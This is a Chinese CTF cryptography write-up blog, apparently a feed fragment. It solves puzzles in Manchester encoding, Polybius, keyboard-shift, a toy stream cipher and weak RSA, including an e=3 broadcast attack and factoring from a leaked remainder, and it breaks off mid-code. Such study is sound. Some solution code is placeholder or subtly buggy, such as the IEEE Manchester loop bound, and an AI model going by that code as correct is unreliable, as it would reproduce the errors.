<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210711162447275.png" alt="image-20210711162447275"></p>
<blockquote>
<p>解题思路</p>
</blockquote>
<p>计网的知识，曼切斯特和差分曼切斯特</p>
<ol>
<li>标准曼切斯特：低到高 0，高到底 1</li>
<li>IEEE曼切斯特：刚好相反，低到高 1，高到底 0</li>
<li>差分曼切斯特：前后相同为 0，不同为 1</li>
<li>其他类型：只有5，6，9，a这此种字符的</li>
<li>注意：存在字节逆序的问题：每8个字节一逆序</li>
</ol>
<p>老早就在la佬的博客看到，曼切斯特编码的脚本，这次终于用上了，收收好</p>
<p>显然密文中只出现了569a这几个字符，在其他解法这里</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210711174323480.png" alt="image-20210711174323480"></p>
<p>这里是省略第一位的，不排除有其他变式，备份一下脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">long_to_bytes</span>(<span class="params">n</span>):</span></span><br><span class="line">    s = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    pack = struct.pack</span><br><span class="line">    <span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line">        s = pack(<span class="string">&#x27;&gt;I&#x27;</span>, n &amp; <span class="number">0xffffffff</span>) + s</span><br><span class="line">        n = n &gt;&gt; <span class="number">32</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">        <span class="keyword">if</span> s[i] != <span class="string">b&#x27;\000&#x27;</span>[<span class="number">0</span>]:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s = <span class="string">b&#x27;\000&#x27;</span></span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">    s = s[i:]</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 字节逆序</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">byteinvert</span>(<span class="params">str_bin</span>):</span></span><br><span class="line">    ret = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str_bin) // <span class="number">8</span>):</span><br><span class="line">        ret += str_bin[i * <span class="number">8</span>:i * <span class="number">8</span> + <span class="number">8</span>][::-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 标准曼彻斯特</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MCST_stand</span>(<span class="params">str_bin</span>):</span></span><br><span class="line">    ret = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str_bin) // <span class="number">2</span>):</span><br><span class="line">        x = str_bin[i * <span class="number">2</span>:i * <span class="number">2</span> + <span class="number">2</span>]</span><br><span class="line">        <span class="keyword">if</span> x == <span class="string">&#x27;01&#x27;</span>:</span><br><span class="line">            ret += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> x == <span class="string">&#x27;10&#x27;</span>:</span><br><span class="line">            ret += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;stand manchester decode wrong!&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># IEEE规范的曼彻斯特</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MCST_IEEE</span>(<span class="params">str_bin</span>):</span></span><br><span class="line">    ret = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(math.ceil(<span class="built_in">len</span>(str_bin) / <span class="number">8</span>)):</span><br><span class="line">        x = str_bin[i * <span class="number">2</span>:i * <span class="number">2</span> + <span class="number">2</span>]</span><br><span class="line">        <span class="keyword">if</span> x == <span class="string">&#x27;01&#x27;</span>:</span><br><span class="line">            ret += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> x == <span class="string">&#x27;10&#x27;</span>:</span><br><span class="line">            ret += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;stand manchester decode wrong!&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 差分曼彻斯特</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MCST_diff</span>(<span class="params">str_bin</span>):</span></span><br><span class="line">    ret = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(str_bin) // <span class="number">2</span> - <span class="number">1</span>):</span><br><span class="line">        x1 = str_bin[i * <span class="number">2</span>:i * <span class="number">2</span> + <span class="number">2</span>]</span><br><span class="line">        x2 = str_bin[i * <span class="number">2</span> + <span class="number">2</span>:i * <span class="number">2</span> + <span class="number">4</span>]</span><br><span class="line">        <span class="keyword">if</span> x1 == x2:</span><br><span class="line">            ret += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ret += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    str_hex = <span class="string">&#x27;2559659965656A9A65656996696965A6695669A9695A699569666A5A6A6569666A59695A69AA696569666AA6&#x27;</span></span><br><span class="line">    <span class="comment"># str_bin=&#x27;0101010101010101&#x27;</span></span><br><span class="line">    str_bin = <span class="built_in">str</span>(<span class="built_in">bin</span>(<span class="built_in">int</span>(str_hex, <span class="number">16</span>)))[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">    m1 = MCST_IEEE(str_bin)</span><br><span class="line">    m2 = MCST_stand(str_bin)</span><br><span class="line">    m3 = MCST_diff(str_bin)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\nIEEE曼彻斯特:&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(m1)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">int</span>(m1, <span class="number">2</span>)))</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m1, <span class="number">2</span>)))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n 标准曼彻斯特:&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(m2)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">int</span>(m2, <span class="number">2</span>)))</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m2, <span class="number">2</span>)))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n 差分曼彻斯特:&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(m3)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">int</span>(m3, <span class="number">2</span>)))</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m3, <span class="number">2</span>)))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n=============字节逆序=============&#x27;</span>)</span><br><span class="line">    m1 = byteinvert(m1)</span><br><span class="line">    m2 = byteinvert(m2)</span><br><span class="line">    m3 = byteinvert(m3)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\nIEEE曼彻斯特:&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(m1)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">int</span>(m1, <span class="number">2</span>)))</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m1, <span class="number">2</span>)))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n 标准曼彻斯特:&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(m2)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">int</span>(m2, <span class="number">2</span>)))</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m2, <span class="number">2</span>)))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n 差分曼彻斯特:&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(m3)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">int</span>(m3, <span class="number">2</span>)))</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m3, <span class="number">2</span>)))</span><br></pre></td></tr></table></figure>

<h2 id="Polybius"><a href="#Polybius" class="headerlink" title="Polybius"></a>Polybius</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">密文：ouauuuoooeeaaiaeauieuooeeiea hint：VGhlIGxlbmd0aCBvZiB0aGlzIHBsYWludGV4dDogMTQ=</span><br></pre></td></tr></table></figure>

<p>hint解出来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">The length of this plaintext: 14</span><br></pre></td></tr></table></figure>

<p>密文全部是由5个元音字母组成，明文的长度是密文的一半，题目提示是是波利比奥斯棋盘密码，没有说密钥</p>
<p>所谓的波利比奥斯棋盘密码，和 playfair 同属于棋盘密码，它用字符表的坐标来代替坐；所以只有1-5，和playfair一样默认用 i 代替 j；这里没有特殊说明，密钥就取这个了</p>
<p>先转成数字，这里第一次犯了迷糊，因为不一定是以 aeiou 的顺序，还需要爆破，这就意味有120种可能；找到了现成的 python 库实现</p>
<p>看一遍就能懂，有一个坑，害我最后直接调试库里的代码才改正，就是这个参数必须给它大写的，不然后面会因为找不到而报错</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210711190015963.png" alt="image-20210711190015963"></p>
<p>EXP</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> permutations</span><br><span class="line"><span class="keyword">from</span> pycipher <span class="keyword">import</span> PolybiusSquare</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_lowercase</span><br><span class="line"></span><br><span class="line">square = ascii_lowercase.replace(<span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">space = <span class="string">&#x27;AEIOU&#x27;</span></span><br><span class="line">cipher = <span class="string">&#x27;ouauuuoooeeaaiaeauieuooeeiea&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> permutations(space, <span class="number">5</span>):</span><br><span class="line">    l = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">list</span>(i))</span><br><span class="line">    p = PolybiusSquare(key=square, size=<span class="number">5</span>, chars=l)</span><br><span class="line">    m = p.decipher(cipher).lower()</span><br><span class="line">    <span class="keyword">if</span> m.startswith(<span class="string">&#x27;flag&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(m)</span><br></pre></td></tr></table></figure>

<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210711190109271.png" alt="image-20210711190109271"></p>
<p>好家伙找到了宝藏了</p>
<h1 id="密码学AK赛"><a href="#密码学AK赛" class="headerlink" title="密码学AK赛"></a>密码学AK赛</h1><h2 id="加法"><a href="#加法" class="headerlink" title="加法"></a>加法</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vtu[ypslg;sh&#125;lrunpstf[sddeptf\</span><br></pre></td></tr></table></figure>

<p>冥冥之中很熟悉，但却说不出来是啥加密；本来打算放弃，然后随便抽取一段出来出来搜，发现一篇CSDN的博客，讲的是为了使密码安全，将密码键位向右移动一位，所谓的键位就是在键盘上位置</p>
<p>直接手撕</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cryptoakflag&#123;keyboardpassword&#125;</span><br></pre></td></tr></table></figure>

<hr>
<p>不做了，先到这里吧，瞄了一眼姜少的排名，竟然差这么多，害，差距已经那么大了吗</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
      <tags>
        <tag>曼切斯特</tag>
        <tag>CopperSmith</tag>
      </tags>
  </entry>
  <entry>
    <title>20210807 rar BSidesNoidaCrypto方向部分WP</title>
    <url>/posts/80918a4f/</url>
    <content><![CDATA[<p>国外的题目小二活，尚师傅得心应手，自己还需努力</p>
<span id="more"></span>

<h2 id="RARCTF"><a href="#RARCTF" class="headerlink" title="RARCTF"></a>RARCTF</h2><p>注意：没有给数据的题目一般都是给了个nc连接</p>
<h3 id="Crypto-minigen"><a href="#Crypto-minigen" class="headerlink" title="Crypto-minigen"></a>Crypto-minigen</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="string">&#x27;def f(x):&#x27;</span>+<span class="string">&#x27;yield((x:=-~x)*x+-~-x)%727;&#x27;</span>*<span class="number">100</span>)</span><br><span class="line">g=f(<span class="built_in">id</span>(f));<span class="built_in">print</span>(*<span class="built_in">map</span>(<span class="keyword">lambda</span> c:<span class="built_in">ord</span>(c)^<span class="built_in">next</span>(g),<span class="built_in">list</span>(<span class="built_in">open</span>(<span class="string">&#x27;f&#x27;</span>).read())))</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">281 547 54 380 392 98 158 440 724 218 406 672 193 457 694 208 455 745 196 450 724</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">A stream cipher in only 122 bytes!</span><br><span class="line">Note: This has been tested on python versions 3.8 and 3.9</span><br></pre></td></tr></table></figure>

<p>题目不长，但比较难读这样精简的python代码，<em>在尚师傅手把手的点拨下艰难地签完到</em></p>
<p>要知道exec，yield，id主要这三个函数以及python中取反符号<code>~</code>的等价表达式，建议百度</p>
<p>经过层层剖析，最后提取这样一个流密码算法，当然还要模上727</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/minigen.png" alt="minigen"></p>
<p>然后我在草稿纸上写着$(x+1)^2+(x+1)+1-x^2-x-1=2x+2$，然后确实神志不太清，没想到了</p>
<p>尚师傅一眼看出，不同的id(f)内，一个id(f)，或者称为流密码的起始状态固定，那么后面两个迭代器g之间相差的值是固定的</p>
<p>比如举个栗子，比如id(f)=1，那每个g之间就依次相差<code>4 6 8 10 12……</code>，而且整个空间是在模727下的，所以要爆破也在爆破的范围内</p>
<p>但是没有爆破的必要，假设flag的开头就是’rarctf’，那么我们异或回去，g的前6个值分别是<code>363 578 68 287 508</code>，可以看出它们之间依次相差<code>215 217 219 221 223</code>，然后往后走就好了，求得g，异或回去还不简单</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="built_in">exec</span>(<span class="string">&#x27;def f(x):&#x27;</span>+<span class="string">&#x27;yield((x:=-~x)*x+-~-x)%727;&#x27;</span>*<span class="number">100</span>)</span><br><span class="line"><span class="comment"># print(*map(lambda c:ord(c)^next(g),list(open(&#x27;f&#x27;).read())))</span></span><br><span class="line"><span class="comment"># ((x:=-~x)*x+-~-x)%727</span></span><br><span class="line">c = <span class="string">&#x27;281 547 54 380 392 98 158 440 724 218 406 672 193 457 694 208 455 745 196 450 724&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">fi = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c.split(<span class="string">&#x27; &#x27;</span>):</span><br><span class="line">    fi.append(<span class="built_in">int</span>(i))</span><br><span class="line">flag = <span class="string">&#x27;r&#x27;</span></span><br><span class="line">s = <span class="number">363</span></span><br><span class="line">x = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> fi[<span class="number">1</span>:]:</span><br><span class="line">    flag += <span class="built_in">chr</span>((s + <span class="number">215</span> + <span class="number">2</span> * x) % <span class="number">727</span> ^ i)</span><br><span class="line">    s = (s+<span class="number">215</span>+<span class="number">2</span>*x) % <span class="number">727</span></span><br><span class="line">    x += <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>再次感谢尚师傅带我打CTF</p>
<h3 id="Crypto-sRSA"><a href="#Crypto-sRSA" class="headerlink" title="Crypto-sRSA"></a>Crypto-sRSA</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">256</span>)</span><br><span class="line">q = getPrime(<span class="number">256</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">0x69420</span></span><br><span class="line"></span><br><span class="line">flag = bytes_to_long(<span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>).read())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e =&quot;</span>, e)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ct =&quot;</span>,(flag * e) % n)</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">n = 5496273377454199065242669248583423666922734652724977923256519661692097814683426757178129328854814879115976202924927868808744465886633837487140240744798219</span><br><span class="line">e = 431136</span><br><span class="line">ct = 3258949841055516264978851602001574678758659990591377418619956168981354029697501692633419406607677808798749678532871833190946495336912907920485168329153735</span><br></pre></td></tr></table></figure>

<p>用到ElGamal类似的思想，直接求逆元</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>有手就行</p>
<h3 id="Crypto-unrandompad"><a href="#Crypto-unrandompad" class="headerlink" title="Crypto-unrandompad"></a>Crypto-unrandompad</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, long_to_bytes, bytes_to_long</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keygen</span>():</span> <span class="comment"># normal rsa key generation</span></span><br><span class="line">  primes = []</span><br><span class="line">  e = <span class="number">3</span></span><br><span class="line">  <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">      p = getPrime(<span class="number">1024</span>)</span><br><span class="line">      <span class="keyword">if</span> (p - <span class="number">1</span>) % <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    primes.append(p)</span><br><span class="line">  <span class="keyword">return</span> e, primes[<span class="number">0</span>] * primes[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span>(<span class="params">m, n</span>):</span> <span class="comment"># pkcs#1 v1.5</span></span><br><span class="line">  ms = long_to_bytes(m)</span><br><span class="line">  ns = long_to_bytes(n)</span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">len</span>(ms) &gt;= <span class="built_in">len</span>(ns) - <span class="number">11</span>:</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">  padlength = <span class="built_in">len</span>(ns) - <span class="built_in">len</span>(ms) - <span class="number">3</span></span><br><span class="line">  ps = long_to_bytes(getrandbits(padlength * <span class="number">8</span>)).rjust(padlength, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">int</span>.from_bytes(<span class="string">b&quot;\x00\x02&quot;</span> + ps + <span class="string">b&quot;\x00&quot;</span> + ms, <span class="string">&quot;big&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">m, e, n</span>):</span> <span class="comment"># standard rsa</span></span><br><span class="line">  res = pad(m, n)</span><br><span class="line">  <span class="keyword">if</span> res != -<span class="number">1</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;c: <span class="subst">&#123;<span class="built_in">pow</span>(m, e, n)&#125;</span>&quot;</span>)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;error :(&quot;</span>, <span class="string">&quot;message too long&quot;</span>)</span><br><span class="line"></span><br><span class="line">menu = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">[1] enc()</span></span><br><span class="line"><span class="string">[2] enc(flag)</span></span><br><span class="line"><span class="string">[3] quit</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">e, n = keygen()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n: <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">print</span>(menu)</span><br><span class="line">    opt = <span class="built_in">input</span>(<span class="string">&quot;opt: &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> opt == <span class="string">&quot;1&quot;</span>:</span><br><span class="line">      encrypt(<span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;msg: &quot;</span>)), e, n)</span><br><span class="line">    <span class="keyword">elif</span> opt == <span class="string">&quot;2&quot;</span>:</span><br><span class="line">      encrypt(bytes_to_long(<span class="built_in">open</span>(<span class="string">&quot;/challenge/flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()), e, n)</span><br><span class="line">    <span class="keyword">elif</span> opt == <span class="string">&quot;3&quot;</span>:</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&quot;bye&quot;</span>)</span><br><span class="line">      exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&quot;idk&quot;</span>)</span><br><span class="line">  <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;error :(&quot;</span>, e)</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Yeah I use randomized padding, it increases security!Note: This is a part 1 challenge of randompad. Take a look at the source for that one and compare the two for a hint on how to solve.</span><br></pre></td></tr></table></figure>

<p>提示审计另外一道题目的代码，发现很有意思的地方，还是要看仔细</p>
<p>这道题虽然有pad函数，但是并没有作用到m上，直接给m加密了，所以题目的攻击点只能在e=3上（因为我从$p-1=3k+1$上没有获得任何线索）</p>
<p>然后我也很异或，一个广播攻击我给看了好久，注意力确实不集中，想得太复杂了；知道是广播后也就没什么好说的了</p>
<p>此外，这种类型的题目确实比直接给三组$(c_i,\ n_i)$要隐晦许多，还是挺不错的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flagprint(flag)</span><br></pre></td></tr></table></figure>

<h3 id="Crypto-babycrypt"><a href="#Crypto-babycrypt" class="headerlink" title="Crypto-babycrypt"></a>Crypto-babycrypt</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long</span><br><span class="line"></span><br><span class="line">flag = bytes_to_long(<span class="built_in">open</span>(<span class="string">&quot;/challenge/flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>).read())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">genkey</span>():</span></span><br><span class="line">    e = <span class="number">0x10001</span></span><br><span class="line">    p, q = getPrime(<span class="number">256</span>), getPrime(<span class="number">256</span>)</span><br><span class="line">    <span class="keyword">if</span> p &lt;= q:</span><br><span class="line">      p, q = q, p</span><br><span class="line">    n = p * q</span><br><span class="line">    pubkey = (e, n)</span><br><span class="line">    privkey = (p, q)</span><br><span class="line">    <span class="keyword">return</span> pubkey, privkey</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">m, pubkey</span>):</span></span><br><span class="line">    e, n = pubkey</span><br><span class="line">    c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line">pubkey, privkey = genkey()</span><br><span class="line">c = encrypt(flag, pubkey)</span><br><span class="line"></span><br><span class="line">hint = pubkey[<span class="number">1</span>] % (privkey[<span class="number">1</span>] - <span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;pubkey:&#x27;</span>, pubkey)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;hint:&#x27;</span>, hint)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c:&#x27;</span>, c)</span><br></pre></td></tr></table></figure>

<p>呜呜呜尚师傅带带</p>
<p>题目意思很清楚，攻击点只有一个$hint=n%(q-1)$且$p&gt;=q$<br>我是没有任何思路，一直想往dp泄漏上靠；但这道题很眼熟，我记得尚师傅讲过类似的，利用同余以及整除的性质</p>
<p>下面开始复现</p>
<p>将n换成另外一种表达形式，根据同余的性质$a\equiv b\ (mod\ n)$且$c\equiv d\ (mod\ n)$， 则$a+b\equiv c+d\ (mod\ n)$，这里相当于反过来<br>$n\%(q-1)=((p-1)(q-1)+(p+q-1))\%(q-1)=(p+q-1)\%(q-1)=p%(q-1)$</p>
<p>再把hint带入<br>$$<br>hint=p\%(q-1)<br>$$<br>即<br>$$<br>p=k(q-1)+hint<br>$$<br>由条件已知p比q大，所以假设k是正的，而且相同位数的，k不会很大，可爆</p>
<p>已知n，将p替换<br>$$<br>n/q=k(q-1)+hint<br>$$<br>$$<br>n=k(q^2-q)+hint\times q<br>$$<br>显然可以解一个一元二次方程<br>$$<br>kq^2+(hint-k)q-n=0<br>$$<br>判断$\Delta =(hint-k)^2+4kn$，或者直接用sage或者python的库解方程，比赛的时候写得比较烂，但是好像k=1就解出来了</p>
<p>尚师傅yyds</p>
<p>话说回来，我觉得泄漏nq也应该算是一种rsa的经典攻击，但网上现在鲜有见到</p>
<h3 id="Crypto-Shamir’s-Stingy-Sharing"><a href="#Crypto-Shamir’s-Stingy-Sharing" class="headerlink" title="Crypto-Shamir’s Stingy Sharing"></a>Crypto-Shamir’s Stingy Sharing</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random, sys</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bxor</span>(<span class="params">ba1,ba2</span>):</span></span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">bytes</span>([_a ^ _b <span class="keyword">for</span> _a, _b <span class="keyword">in</span> <span class="built_in">zip</span>(ba1, ba2)])</span><br><span class="line"></span><br><span class="line">BITS = <span class="number">128</span></span><br><span class="line">SHARES = <span class="number">30</span></span><br><span class="line"></span><br><span class="line">poly = [random.getrandbits(BITS) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(SHARES)]</span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&quot;/challenge/flag.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"></span><br><span class="line">random.seed(poly[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(bxor(flag, long_to_bytes(random.getrandbits(<span class="built_in">len</span>(flag)*<span class="number">8</span>))).<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	x = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;Take a share... BUT ONLY ONE. &#x27;</span>))</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;Do you know what an integer is?&#x27;</span>)</span><br><span class="line">	sys.exit(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">abs</span>(x) &lt; <span class="number">1</span>:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;No.&#x27;</span>)</span><br><span class="line"><span 